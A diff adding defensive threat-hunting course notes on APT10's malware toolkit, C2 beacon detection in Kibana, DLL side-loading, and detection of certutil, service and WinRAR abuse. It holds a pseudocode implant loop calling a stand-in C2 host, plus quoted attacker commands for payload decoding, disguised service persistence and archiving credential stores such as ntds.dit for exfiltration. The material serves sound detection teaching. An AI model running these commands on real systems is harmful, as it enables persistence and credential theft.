@@ -1417,9 +1417,344 @@
 - Use the Discover - Elastic - Sysmon - Process and Network discover workspace, and any other available dashboard or visualization, existing or newly created, to conduct this portion of the investigation.
 
 ## APT 10 Attack & Defenses
+### APT 10 Malware Toolkit
+- APT10 makes use of several tools to carry out its operations.
+- These tools roughly fall into three categories:
+   1. Pre-existing legitimate tools and utilities (WinRAR, ping and net commands, the certutil Windows utility, and others)
+   2. Open-source malware (Mimikatz, QuasarRAT, Trochilus, and others)
+   3. Custom closed-source malware likely produced by APT10 and/or other Chinese-affiliated actors (PoisonIvy, PlugX, RedLeaves, ChChes, and other less-notable examples)
+- This lesson does not discuss some of the more-common Windows utilities — with the exception of APT10’s use of WinRAR — as they are used by a wide variety of threat actors and are not specific to APT10.
 
+#### PoisonIvy
+- **PoisonIvy** is one of the oldest RATs affiliated with APT10, and was used during the Technology Theft Campaign as described in the US federal indictment.
+- According to the MITRE ATT&CK database and other sources, **PoisonIvy** is used by at least 10 other threat actor groups, most of whom are suspected or confirmed to be affiliated with the Chinese government.
+- According to **PwC** and **BAE** Systems, APT10 has **not been directly associated** with any attacks involving the PoisonIvy malware **since 2014**, instead seeming to prefer the use of other malware tools.
+- Notable capabilities of the PoisonIvy malware include the ability to **perform DLL injection**, the **encryption of C2 communications**, and the **ability to install a rootkit** onto the system.
+- MITRE ATT&CK lists the following techniques in association with PoisonIvy:
+<img width="1215" height="1083" alt="a40a4136-8abe-4bd6-9410-817338e030c8" src="https://github.com/user-attachments/assets/72728b99-6d72-405d-bf95-54adce2e593f" />
 
+### PlugX
+- PlugX is a RAT used by multiple Chinese threat actors, such as APT3, APT10, and APT41.
+- PlugX is a modular tool, meaning that actors can add or remove modules to change PlugX’s capabilities and threat presentation.
+- PlugX has a large amount of capabilities due to its modular design, including the ability to use several different network protocols for C2 communications and the manipulation of system services to establish persistence or perform actions on objectives.
+- PwC and BAE systems state that PlugX has been used by APT10 in campaigns since 2014, though APT10 seems to be replacing PlugX with custom malware RedLeaves and ChChes in more recent attacks.
+- One notable capability seen across many samples of PlugX is the ability to perform DLL side-loading attacks.
+- MITRE ATT&CK lists the following techniques in association with PlugX:
+<img width="1215" height="1761" alt="bfd852d9-5f21-4b1b-8cd9-cc6c876d7a6e" src="https://github.com/user-attachments/assets/cd17f37f-fae8-4bd3-a45e-419d329a81b2" />
 
+### RedLeaves
+- RedLeaves is another RAT that has been utilized by APT10. According to MITRE, RedLeaves' code overlaps with PlugX and may be based upon the open source tool Trochilus.
+- Notably, RedLeaves has only ever been seen in conjunction with attacks conducted by APT10; other threat actors — even those working under the direction of the Chinese state — have not been seen using RedLeaves in their attacks.
+- Notable capabilities of RedLeaves include performing encrypted C2 communications — potentially over non-standard ports — and a wide array of system and network reconnaissance capabilities that can be deployed post-infection.
+- According to the Operation Cloud Hopper Technical Annex produced by PwC and BAE systems, RedLeaves is a versatile tool that would allow APT10 to quickly gain a foothold and further exploit the access before the actor deploys more sustained malware like PlugX or Quasar.
+- NOTE: Trochilus is another open-source RAT, though it has not been directly associated with APT10 beyond similarities to the RedLeaves code.
+- MITRE ATT&CK lists the following techniques in association with RedLeaves:
+<img width="1215" height="1452" alt="60aab26e-a73d-406c-beea-7a4c462edefb" src="https://github.com/user-attachments/assets/f8c934c5-b101-4a55-83fb-a6d46ec4ec39" />
 
+### ChChes
+- ChChes is a small modular tool that has been seen in a few APT10 attacks against Japanese or Japanese-affiliated organizations starting in 2016.
+- Palo Alto Network’s Unit42 team has said that the ChChes tool may only be a first stage tool used by the attackers to orient where they landed in a network; this is because ChChes on its own does not contain many capabilities.
+- By default, ChChes only contains functions that perform basic system reconnaissance, C2 communication, and the ability to load and execute new modules.
+- Unlike PlugX, these modules do not come precompiled into the ChChes malware; they must be transmitted from the C2 server before being loaded and executed by the malware implant.
+- Several ChChes modules have been identified and analyzed by the Japan Computer Emergency Response Team (JPCERT), who believe that the modules provide ChChes with the following additional capabilities:
+   - Encrypt C2 communications using Advanced Encryption Standard (AES); this encryption is applied as an additional layer on top of the normal encryption used by the ChChes malware
+   - Execute shell commands
+   - Upload and download files
+   - Load and run DLLs
+- Notably, ChChes implants communicate with the C2 server by sending encrypted data within HTTP cookie headers.
+![Uploading d61e39be-87f1-48e4-824c-25314e0bd615.png…]()
 
+### C2 Beaconing
+- C2 traffic is a vital part of an actor’s post-infection operations — without the ability to communicate with a malware implant loaded on a victim host, threat actors would be unable to carry out the ultimate goals of their attack campaign.
+- C2 beaconing is the process by which a malware implant makes repeated network connections to attacker-controlled infrastructure, in order to receive new instructions from the attack operator.
+- Each of these network connections can be referred to as a beacon.
+- C2 beaconing can occur over any network protocol, but most threat actors make use of a few common protocols.
+- APT10 malware has been seen to communicate heavily over **HTTP**, **HTTPS**, and **DNS** — none of which are uniquely utilized by APT10.
 
+#### HTTP Communications in Malware
+- Recall from earlier in this course that HTTP communication is performed between a client and a server.
+- A client specifies the type of HTTP request it is making to the server, the resource targeted by that request, and can specify additional information in the request header and payload body of the request.
+- The server looks at the client’s request and handles it based on the resource targeted, the data included in the payload, or other determining factors about the connection.
+<img width="763" height="572" alt="42361bf8-5812-4a64-8502-afbe274d317a" src="https://github.com/user-attachments/assets/989a64c1-35b8-4b4e-89d8-48e09e32f4f3" />
+
+- When a malware client is using HTTP to perform C2 communications, it is usually trying to blend in with the large amount of HTTP traffic that is present in modern networks.
+- However, the HTTP information sent by the malware client must reach the attacker’s corresponding HTTP server.
+- Thus, the attacker must choose the destination server name and/or Internet Protocol (IP) address.
+- Additionally, the attacker’s server must be configured to handle incoming requests from the malware client and respond appropriately; this handling may be based on the resource path targeted by the malware client, any HTTP client headers sent by the malware, and any payload data present in the HTTP request.
+- These items can all be used as indicators in order to identify malicious HTTP traffic.
+
+#### Malicious HTTPS Communications
+- HTTPS refers to the usage of HTTP over an encrypted Transport Layer Security (TLS) channel, and is widely implemented across the modern internet.
+- When making an HTTPS connection, a TLS-encrypted communication channel is established first; regular HTTP communication is then sent over the encrypted TLS channel.
+- HTTPS offers a huge boon to attackers — all information present in the HTTP request is encrypted, with the exception of the intended destination domain or IP address.
+- However, this boon is not only available to actors utilizing HTTPS — simply encrypting network communications before sending them over any protocol offers many of the same benefits to an attacker.
+- Namely, network defenders and Intrusion Detection Systems (IDS) are prevented from inspecting many of the indicators that they would normally rely on to investigate non-encrypted traffic. 
+
+#### Detecting Encrypted C2 Beacons 
+- Luckily, analysts can take advantage of connection metadata to identify potential malicious connections.
+- For example, a large amount of bytes transferred out of the network — even if those bytes are encrypted — may indicate that a large file was sent out of the network.
+- When it comes to the identification of malicious communications — especially malicious C2 communications — the time at which a connection occurred is an extremely useful piece of metadata.
+- Connection time data allows a security analyst to take advantage of a common property of attacker C2 beaconing activity.
+- Attackers need to automate their malware’s C2 beacon requests so that they occur without direct attacker interaction.
+- When discussing malware implants, automated C2 beacon requests usually means that network callouts to a malicious C2 server are made on a repeating schedule.
+- Often, this schedule is built into the malware via a sleep() call — the malware implant sleeps for some specified amount of time, then wakes up and initiates a C2 beacon to see if there are any new commands for it to run.
+- A pseudocode example of a simple malware implant that performs this behavior is presented below.
+
+```
+while true {    // infinite loop, so the malware runs forever
+   
+    // Connect to the C2 server and retrieve a command to run
+    // Also, send the C2 server the output of the last command
+    command_to_run = initiateC2Connection("maliciousdomain.com", command_output)
+    
+    // Run the command retrieved from the server, if there is one
+    if command_to_run exists {
+        // Store output to send during later C2 communication
+        command_output = runCommand(command_to_run)
+    }
+        
+    // Go to sleep for 30 seconds
+    sleep(30)
+}
+```
+- Based on the pseudocode above, the malware makes a connection to the C2 server every 30 seconds.
+   - Of course, this is just an approximation — the exact connection time varies slightly.
+- Analysis of potential C2 traffic can be performed by looking at the period of time between C2 beacons, which is known as the C2 beacon interval.
+- These C2 beacon intervals are the core of this analysis technique: by identifying regular intervals between network connections, an analyst can make the determination that these connections are automated in some fashion, and thus, are more likely to be associated with malicious activity. 
+
+<img width="822" height="516" alt="840e79c2-08f3-42d7-bfc5-3121fa0c7e0c" src="https://github.com/user-attachments/assets/8d28ab62-25ae-4165-8b97-792c9e44c7bb" />
+
+- Notably, this method of identifying C2 beacons can be used regardless of the original communication protocol, since it relies only on the source of the connection, the destination of the connection, and the time at which the connection was made.
+- This method may be one of the only options available to analysts in order to identify C2 communications that have been encrypted in some fashion, especially when the type of encryption being used is unknown.
+
+### Identifying C2 Beacon Intervals in Kibana
+- The method used to identify C2 beacon intervals is heavily dependent on the analysis tools that are available to the analyst.
+- Advanced data analysis tools, such as the pandas library for the Python programming language, can make easy work of calculating C2 beacon intervals across incredibly large datasets, and are a natural fit for broad analysis tasks.
+- Though Kibana/Elasticsearch can be set up to calculate C2 beacon intervals, it is a complex and laborious process that can significantly impact the performance of an Elasticsearch cluster.
+- Instead, this lesson focuses on a method that is more natural to Kibana — a visualization is created in order to determine if suspicious traffic has occurred on a regular interval.
+
+#### Identifying Suspicious Domains
+- The first step in performing C2 beacon analysis with Kibana is to figure out the analysis target.
+- This target is likely a suspicious domain or IP address being contacted by a host present within the network.
+- Figure 19.2-4 demonstrates using a Kibana data table visualization to identify suspicious domain names within DNS requests.
+- In Figure 19.2-4, the suspicious domain tw1tter.com is identified as a possible malicious domain, due to the use of a domain-spoofing technique.
+<img width="2120" height="1063" alt="9e08c43b-20f4-4fd7-807d-48a346856737" src="https://github.com/user-attachments/assets/4a2eac81-6c5a-4e0a-ae98-ff5d8e5016a5" />
+
+#### Categorizing Traffic by Source
+- Once a suspicious domain has been identified, the connections to that domain must be broken out per unique source.
+- To illustrate why this is necessary, imagine an example where two machines on the same network are infected with the same malware.
+- The infections occur 10 seconds apart, and the malware is configured to perform a C2 beacon connection every 30 seconds.
+- Figure 19.2-5 illustrates this example, and shows that failing to separate the connections per unique source results in irregular beacon intervals, which can obscure the analysis results.
+   - Victim 1 and Victim 2 show very regularly-spaced beacons, while their combined traffic shows irregular intervals.
+<img width="824" height="516" alt="c12656c2-f61b-4677-811d-941eca181d2a" src="https://github.com/user-attachments/assets/48e31a2d-0173-459f-b9a6-0ee3a6f69707" />
+
+- In Kibana, separating multiple connections can be done by searching or filtering on the specific source and destination of the connection of interest.
+- In the example tw1tter.com connections, only one source was connecting out to the suspicious domain, so no other searches or filters are required.
+
+#### Identify Connection Intervals
+- The Discover timechart can be used to show the C2 beacon interval.
+- In order to successfully accomplish this, the timechart’s bucket interval must be set below the suspected C2 beacon time.
+- If this is done correctly, the timechart shows the regular C2 beacon intervals on the timechart.
+- Figure 19.2-6 shows that the connections to tw1tter.com have an approximate C2 beacon interval of 15 minutes.
+<img width="2120" height="752" alt="7897b8ae-31eb-4962-8b2a-4ff7117b0421" src="https://github.com/user-attachments/assets/18e61307-a47e-4907-9cfb-284bbd3c13a7" />
+
+- Adversary Evasion Techniques
+   - To help avoid detection of their C2 beacons, the adversary can choose to lengthen or randomize the interval between C2 beacon connections.
+   - Most adversaries usually strike a balance between usability and stealth — they want to ensure that their malware is not too noisy — to avoid suspicion from network defenders — but that it beacons back often enough to receive new commands in a timely fashion.
+   - One way an adversary can obscure their malware’s C2 beacon intervals is by the addition of jitter.
+   - The adversary can set some standard amount of time for their beacon to communicate, and then add or subtract a randomly-generated amount of additional time.
+   - For example, an adversary may set a C2 beacon interval of every 30 minutes, ± up to 5 minutes, leading to C2 beacon intervals anywhere between 25 and 35 minutes.
+   - This increased variability makes it harder to detect C2 traffic via the beacon detection methods discussed above.
+   - Other methods of beacon detection evasion also exist, including setting longer C2 beacon intervals.
+   - Advanced adversaries who wish to remain as stealthy as possible may only receive a C2 beacon from a malware implant every few days, which makes them extremely hard to detect.
+
+### Beacon Detection Kibana Steps
+1. Open Kibana, and create a new visualization -> data table
+2. Update your timeframe
+3. Add a bucket with the following info:
+   - Field: dns.highest_registered_domain.keyword
+   - Order by: Metric: Count
+   - Order: Descending
+   - Size: 100
+4. Look through the data to find suspicious dns (badguy.com)
+5. Filter for this domain
+6. Switch the _Field_ to _source.ip_, showing any IP's that are communicating to this domain
+7. Go to the discover page, and make sure your timeline is correct; filter for `event.module:zeek AND dns.highest_registered_domain:badguy.com AND source.ip:172.16.4.3`
+8. Change the _Auto_ dropdown to _Minute_ in order to see how often it is happening
+
+### APT10 TTP | DLL Side-Loading
+- In many documented APT10 attacks, they make use of a technique known as DLL side-loading in order to cause a legitimate application to load and execute malicious code.
+- This technique allows APT10 to better evade detection.
+- In order to understand the DLL side-loading technique, you must first understand a broader technique known as DLL hijacking.
+
+#### DLL Review
+- Microsoft’s documentation describes a DLL as a module that contains functions and data that can be used by another module (application or DLL).
+- The main role of a DLL is to implement functionality that can be shared across multiple applications, leading to more efficient utilization of system memory, standardization of functionality across multiple applications, and code that is easier to update and manage.
+
+#### Exported DLL Functions
+- Functions within DLLs can either be exported functions or internal functions.
+- Internal functions are typically used by code within the DLL itself; for example, the DLL might have an internal helper function that accomplishes a small piece of some larger task.
+- Exported functions may be called from within a DLL, but may also be called by external modules.
+- Exported functions act as the interface between applications that wish to utilize the functionality of a DLL, and the actual code that implements the desired functionality.
+- Exported function interfaces are defined by the function name, along with any input variables required for the function to operate.
+- For example, the OpenProcess function exported by the heavily-used kernel32.dll allows one process to request a handle to another process, and is defined in the following fashion:
+
+```
+OpenProcess(
+  DWORD dwDesiredAccess,
+  BOOL  bInheritHandle,
+  DWORD dwProcessId
+)
+```
+
+- As an example, suppose ProcessA wants to request a handle to ProcessB.
+- To do so, ProcessA must load the kernel32.dll and call the exported OpenProcess function by providing it the following information:
+   - **dwDesiredAccess**: A 32-bit number (DWORD) that represents the desired level of access that ProcessA is requesting
+   - **bInheritHandle**: A boolean value (BOOL) that indicates whether ProcessA wants any of its child processes to inherit the handled
+   - **wProcessId**: A DWORD representing the PID of ProcessB
+
+### DLL Search Order Hijacking
+- When a programmer wishes to use functionality provided by an exported function of a DLL, they need to import that DLL into their program by specifying the name of the DLL they wish to use; this enables the use of that DLL’s exported functions within the program that is importing it.
+- When the program runs and the system needs to load the DLL, the system must search for it by using the DLL name provided by the programmer.
+- The system searches for the DLL by following the system’s DLL search order, which can vary based on whether the system is configured to use **SafeDllSearchMode** or not.
+   - This setting is configured via a registry key, located at **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\SafeDllSearchMode**.
+- Microsoft’s Dynamic-Link Library Search Order documentation describes the search order as follows:
+   - If SafeDllSearchMode is enabled, the search order is as follows:
+      1. The directory from which the application loaded
+      2. The system directory
+      3. The 16-bit system directory
+      4. The Windows directory
+      5. The current directory
+      6. The directories that are listed in the PATH environment variable
+
+   - If SafeDllSearchMode is disabled, the search order is as follows:
+      1. The directory from which the application loaded
+      2. The current directory
+      3. The system directory
+      4. The 16-bit system directory
+      5. The Windows directory
+      6. The directories that are listed in the PATH environment variable
+
+- The only **exception to the above** search order is for a small list of DLLs included in the **KnownDLLs** registry key, **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs**.
+- Any DLLs located on the KnownDLLs list are **loaded immediately from the location** specified in the registry key, if their DLL name is imported by an application.
+- For all DLLs not included within the KnownDLLs list, an attacker can potentially take advantage of the search order in order to force legitimate applications to load a malicious DLL
+
+### Complications of DLL Search Order Hijacking
+- In the demonstration you just saw, the UxTheme.dll file was not malicious — a legitimate version of the file was copied from its expected location — the system folder — to the desktop.
+- Recall, however, that the hijacked Task Manager crashed pretty quickly upon launching, even though the only thing that changed was the location of the executable and the UxTheme.dll file.
+- This demonstrates one issue with DLL hijacking techniques — adversaries who want to abuse them must do so carefully.
+- A gold standard malicious DLL used for search order hijacking would act as a shim — the malicious DLL would be able to perform the original DLL’s intended functions, in addition to the adversary’s desired malicious ones, and would likely need a robust method of dealing with potential errors.
+- This would give the adversary the greatest chances of remaining stealthy within the system.
+- As it turns out, DLL search order hijacking is really difficult for a lot of adversaries to perform — as such, many adversaries do not go through the trouble required to utilize this technique directly.
+- As you just saw, even something as simple as loading from an unexpected location can cause the hijacked application to crash.
+- Additionally, not all applications are vulnerable to DLL search order hijacking attacks; applications that only load DLLs that are located on the system’s KnownDLLs list are completely invulnerable to this type of attack, as the system never uses the search order when loading these DLLs.
+- Applications can also circumvent the DLL search order by specifying the full path of the DLL they wish to load.
+- Other complications to performing DLL search order hijacking include the presence of other security controls on the system; for example, an adversary that is unable to acquire write access to a directory higher up in the search order is unable to place a malicious DLL inside of it.
+
+#### DLL Side-loading Attacks
+- One of the biggest hurdles to performing a DLL search order hijack is simply finding an application that is vulnerable to being hijacked.
+- Additionally, an adversary may not be able to perform the same hijack everywhere due to all of the different complications that may arise.
+- The victim machine might not have the vulnerable application installed, the application might be installed in a non-standard way that prevents the search order from being hijacked, or additional security controls might be in place that prevent an adversary from taking advantage of the vulnerability.
+- Smart adversaries decided that none of those complications were going to get in their way — if a vulnerable application is not likely to exist on their target system, the adversary can just bring their own copy of a vulnerable application.
+- Honestly, there is not much else to explain about DLL side-loading attacks.
+- To perform one, the adversary drops a malicious DLL alongside a vulnerable — but otherwise legitimate — executable onto the victim system.
+- Placing the DLL and the vulnerable executable in the same folder, followed by launching the executable, is usually all that it takes to get the legitimate application to load and execute the malicious DLL.
+
+- **APT10 Usage of DLL Side-loading Attacks**
+   - APT10 has been seen using DLL side-loading techniques during several attack campaigns.
+   - According to PwC and BAE Systems, APT10 has used DLL side-loading extensively, especially when they were employing the PlugX malware, which has DLL side-loading built in as a default execution mechanism.
+   - Notably, PlugX is unique in that it drops an additional file during DLL side-loading attacks, in addition to the vulnerable executable and malicious DLL file.
+   - This additional file is encrypted, but contains the full malware payload; the task of the malicious DLL file is to simply load, decrypt, and execute the payload file.
+   - In their Cloud Hopper Technical Annex document, PwC and BAE Systems show the following combination of files that have been attributed to APT10 side-loading attacks with the PlugX malware.
+
+- FireEye reported on an APT10 attack targeting the Japanese media sector in July 2018 that involved a maldoc deploying the APT10 custom UPPERCUT backdoor, which contains capabilities similar to ChChes.
+- The backdoor was loaded via DLL side-loading that involved the following files:
+   - GUP.exe: GUP is an open-source binary used by Notepad++ for software updates
+   - libcurl.dll: Malicious loader DLL
+   - 3F2E3AB9: Encrypted shellcode
+- FireEye also reported that DLL side-loading was used by APT10 to deploy the RedLeaves malware — RedLeaves is known to FireEye as BUGJUICE — but does not specify any technical details regarding the files involved in the DLL side-loading attack.
+- Given that the RedLeaves code has been found to overlap with PlugX, it is likely that APT10 made use of the same DLL side-loading technique as PlugX, which includes the telltale third encrypted payload file.
+
+#### DLL Search Order Hijacking/Side-loading Protections
+- Mitigation of DLL search order hijacking vulnerabilities is best performed by application developers.
+- One technique that application developers can use to mitigate the risk of a DLL hijacking attack is to specify the absolute path of the DLL they want their application to load.
+- This means that the system does not need to use the DLL search order to find the DLL, and thus, is not vulnerable to a DLL search order hijacking attack.
+- However, the application is still vulnerable to an attacker wholly replacing the legitimate DLL with a malicious one.
+- A better technique to mitigate hijacking and side-loading attacks involves an application checking the code-signing certificate of a DLL before attempting to call one of that DLL’s exported functions — if this certificate is not present or not valid, the application can raise an error message to the user.
+- Though this may prevent the application from working properly, it is certainly better than executing malicious code! Unfortunately, many applications do not contain valid code-signing certificates in the first place, as securing and managing certificates can be difficult for some developers.
+- For network defenders and security analysts, mitigation of DLL search order hijacking techniques requires frequent patching to keep abreast of newly-discovered vulnerable applications.
+- Additionally, defenders can implement security controls on the system to mitigate DLL hijacking and side-loading attacks.
+- Preventing the installation of new programs without the organization’s consent severely restricts the amount of applications present within the environment, thus reducing the attack space of a DLL search order hijacking attack greatly.
+- As discussed earlier, directories located on the DLL search order can also be protected by implementing filesystem permissions to prevent users from writing new files to these directories.
+- In extremely secure networks, Windows can be configured to require a valid code-signing certificate for all executable code, regardless of whether the executing application checks the certificate.
+- This is one of the safest ways to protect against a wide variety of attacks including DLL search order hijacking and side-loading attacks.
+- However, extremely capable attackers can still subvert these controls by acquiring a legitimate code-signing certificate to apply to their malicious DLL.
+
+#### Detection Mechanisms
+- DLL search order hijacking and side-loading techniques require the attacker to write new files onto the filesystem.
+- Therefore, looking for suspicious files being written to the filesystem — especially in locations known to be on the DLL search order path — can be critical for identifying instances of these attacks.
+- Possible detection mechanisms for DLL search order hijacking or DLL side-loading attacks may include:
+   - DLL files being written to known search order locations
+   - DLL files being written to suspicious directories (%TEMP% or others)
+   - Rare executables launching, especially from suspicious directories (%TEMP% or others)
+
+### Detecting Other APT10 TTPs
+#### Certutil for Payload Decoding
+- The certutil command is a native Microsoft utility that is intended to be used to view and manage certificate information.
+- To facilitate this usage, certutil has the capability to decode Base64 data from the command line; attackers can make use of certutil as a Base64 decoder.
+- Accenture and FireEye have provided analysis that shows the following examples of the certutil command being used within APT10 maldocs to decode payload files:
+   - certutil used in conjunction with the extend command to decode and decompress a legitimate .exe, used later for DLL side-loading:
+      - `cmd.exe /c certutil -decode %temp%\\ZsHUvtNctKYbgPj.txt %temp%\\Yjhdj.cab &&expand %temp%\\YjhdJ.cab -F:* %temp%\\&&%temp%\\AYRUNSC.EXE"`
+
+- certutil used to decode three files, representing APT10’s full package of three files needed to perform DLL side-loading.
+- In this instance, the certutil binary was copied to the %temp% folder and renamed to tcm.tmp prior to execution of the commands below:
+   - `C:\Windows\System32\cmd.exe" /c %temp%\tcm.tmp -decode C:\ProgramData\padre1.txt C:\ProgramData\\GUP.txt`
+   - `C:\Windows\System32\cmd.exe" /c %temp%\tcm.tmp -decode C:\ProgramData\padre2.txt C:\ProgramData\\libcurl.txt`
+   - `C:\Windows\System32\cmd.exe" /c %temp%\tcm.tmp -decode C:\ProgramData\padre3.txt C:\ProgramData\\3F2E3AB9`
+
+- Detection of malicious certutil usage should start with the identification of the -decode command-line switch, which must be present in order for the utility to decode information.
+- By focusing on the -decode switch, analysts gain the added benefit of detecting adversaries who have renamed the certutil binary.
+- Additional filters can then be added to remove other non-certutil binaries, or to narrow the search to specific folder locations of interest.
+
+#### Services as a Persistence Mechanism
+- APT10 used the PlugX malware to manipulate system services, including the installation of a new service as a persistence mechanism.
+- FireEye reported that APT10 used the Service Controller (sc) command-line utility in order to accomplish this during a 2016-2017 attack.
+- APT10 registered a new service to point at a malicious executable — C:\Windows\vss\vixDiskMountServer.exe — that had been written to disk earlier in the attack chain.
+- APT10 used the following sc commands to register the service, attempting to pass it off as a legitimate Corel Writing Tools Utility:
+   - `sc create CorWrTool binPath= "\"C:\Windows\vss\vixDiskMountServer.exe\"" start= auto displayname= "Corel Writing Tools Utility" type= own`
+   - `sc description CorWrTool "Corel Graphics Corporation Applications."`
+
+- Detection of malicious services installed as a persistence mechanism can be done in several ways:
+   - Search for usage of the sc create command to register new services, especially if it occurs in conjunction with the start= auto configuration option.
+   - Search for usage of the sc config command to search for attackers hijacking existing services to point at the attacker’s malicious executables.
+   - Query the registry, which contains a list of the services configured on the system, and attempt to identify suspicious services based on their executable path, name, description, or other properties.
+      - These registry keys are located in **HKLM\SYSTEM\CurrentControlSet\Services**.
+
+#### WinRAR Command-Line Arguments
+- APT10 and other threat actors have frequently made use of the WinRAR utility in order to compress and encrypt data prior to exfiltrating it from a network.
+- Attackers may wish to do this in order to prevent the victim organization from recognizing sensitive data as it is leaving the environment.
+- If an attacker fails to protect exfiltrated data, they may tip off local defenders to an intrusion and be left unable to fully complete their mission.
+- WinRAR can be used via the command line and includes native encryption capabilities, making it a good choice for attackers who wish to compress and encrypt data.
+- Usually, attackers have to move a copy of WinRAR onto the system in order to use it, as they cannot rely on the software being pre-installed on victim systems.
+- Smart attackers frequently rename the WinRAR executable in order to avoid detection from savvy defenders; APT10 is no exception to this, having renamed WinRAR to r.exe and svchost.exe in the past.
+- Detecting command-line usage of WinRAR — especially when it has been renamed — relies on understanding WinRAR’s command-line syntax.
+- According to Cybereason, the following WinRAR commands were utilized by a Chinese threat actor to perform encryption of data prior to exfiltration; this threat actor was likely not APT10, based on other indicators present in the attack, but the commands still show off attacker usage of the tool:
+   - `rar.exe a -k -r -s -m1 -p[password] [REDACTED].rar [REDACTED].temp`
+   - `rar.exe a -k -r -s -m1 -p[password] [REDACTED].rar [REDACTED].csv`
+   - `rar a -r -[password] [REDACTED].rar sam system ntds.dit`
+
+- Based on the commands above, the following command-line options may be useful for identifying command-line usage of the WinRAR utility:
+   - **a command**: Indicates that files should be added to an archive
+      - NOTE: The a command must appear directly after the binary name, though any number of spaces may be between the binary name and the command. Additionally, the a command is not preceded by a hyphen (-).
+   - **-p switch**: Used to encrypt the archive with a specified password
+      - NOTE: The password used begins immediately after the -p switch (i.e., -pThisIsThePassword).
+      - Care must be taken when searching for this switch so that true-positive findings are not accidentally excluded from the results.
+      - **-r switch**: Recurses through subfolders, meaning that the attacker only needs to specify top-level directories that they wish to bundle into the archive folder
+      - **-s switch**: Specifies solid archive mode, meaning that the archive is compressed more efficiently and attackers do not have to exfiltrate as much data over the network
+      - **-k switch**: Used to lock the archive, encrypting it with a password
+- Based on the above, a potential detection mechanism would be to look for the pattern * a * — an a surrounded by spaces — within command-line arguments.
+- If this search proves too broad, additional filtering can be added to focus in on other switches likely to be included in WinRAR command-line usage, such as the -p switch.
+
+### Hunt for APT10
+1. Create new Visualization for any connections going to South Korean IP addresses.
+2. 
